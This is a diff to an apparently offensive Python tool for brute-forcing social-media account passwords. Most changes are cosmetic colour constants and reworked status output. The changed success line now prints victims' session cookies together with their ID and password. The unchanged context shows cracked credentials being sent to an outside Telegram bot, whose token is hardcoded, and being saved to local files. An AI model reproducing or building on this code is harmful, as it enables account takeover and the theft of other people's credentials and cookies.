@@ -280,6 +280,29 @@ O = "\x1b[0;96m"     # Biru Muda
 P = "\x1b[38;5;231m" # Putih
 J = "\x1b[38;5;208m" # Jingga
 A = "\x1b[38;5;248m" # Abu-Abu
+a1 = '\x1b[1;31m'  # سور
+a2 = '\x1b[1;34m'  # شین
+a3 = '\x1b[1;32m'  # سەوز
+a4 = '\x1b[1;33m'  # زەرد
+a5 = '\x1b[38;5;208m'  # پرتەقاڵی
+a6 = '\x1b[38;5;5m'  # مۆر
+a7 = '\x1b[38;5;13m'  # پەمەیی
+a8 = '\x1b[1;30m'  # ڕەش
+a9 = '\x1b[1;37m'  # سپی
+a10 = '\x1b[38;5;52m'  # قاوەیی
+a11 = '\x1b[38;5;8m'  # خۆڵەمێشی
+a12 = '\x1b[38;5;220m'  # زێڕین
+a13 = '\x1b[38;5;7m'  # زیوی
+a14 = '\x1b[38;5;153m'  # شینی کاڵ
+a15 = '\x1b[38;5;18m'  # شینی تۆخ
+a16 = '\x1b[38;5;48m'  # سەوزی کاڵ
+a17 = '\x1b[38;5;22m'  # سەوزی تووخ
+a18 = '\x1b[38;5;196m'  # سوری کاڵ
+a19 = '\x1b[38;5;88m'  # سوری توخ
+a20 = '\x1b[38;5;226m'  # زەردی کاڵ
+a21 = '\x1b[38;5;136m'  # زەردی توخ
+a22 = '\x1b[38;5;216m'  # پرتەقاڵی کاڵ
+a23 = '\x1b[38;5;166m'  # پرتەقاڵێ توچ
  
 ###----------[ RICH COLOR STYLE ]---------- ###
  
@@ -608,7 +631,7 @@ def passwrd():
 def crack(idf,pwv):
     global loop,ok,cp
     bo = random.choice([m,k,h,b,u,x])
-    sys.stdout.write(f"\r\x1b[38;5;220m[RAWA🖤] ℴ {m}[{k}\x1b[38;5;18m{loop}\x1b[38;5;166m{P}/{h}{len(id)}{a19}] - {a16}{a5}OK🦁 - {ok}{a4} - {a7}\x1b[1;33mCP🐍- 0{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P}  "),
+    sys.stdout.write(f"\r\x1b[1;34m[ RAWA - M😄🌪️ ]  {a1}{a6}{loop}{a8}//{a9}{len(id)}{a15} [OK]{a11}{a10}{ok}{a17} ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})"),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -675,7 +698,7 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 requests.get(f"https://api.telegram.org/bot7291662040:AAHdeqNUm62e-VlWLjnYL3seA9qgMkABHj4/sendMessage?chat_id=7155363713&text=\r {idf} | {pw}")
-                print(f'\r{a4}[ RAWA-OK ]  {idf} | {pw}')
+                print(f'\r{a23} [ RAWA - OK🌟 ]\n ID : {idf} : {pw} : {kuki}')
                 open('/sdcard/RAWA-Ok.txt','a').write(idf+' • '+pw+'\n')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 
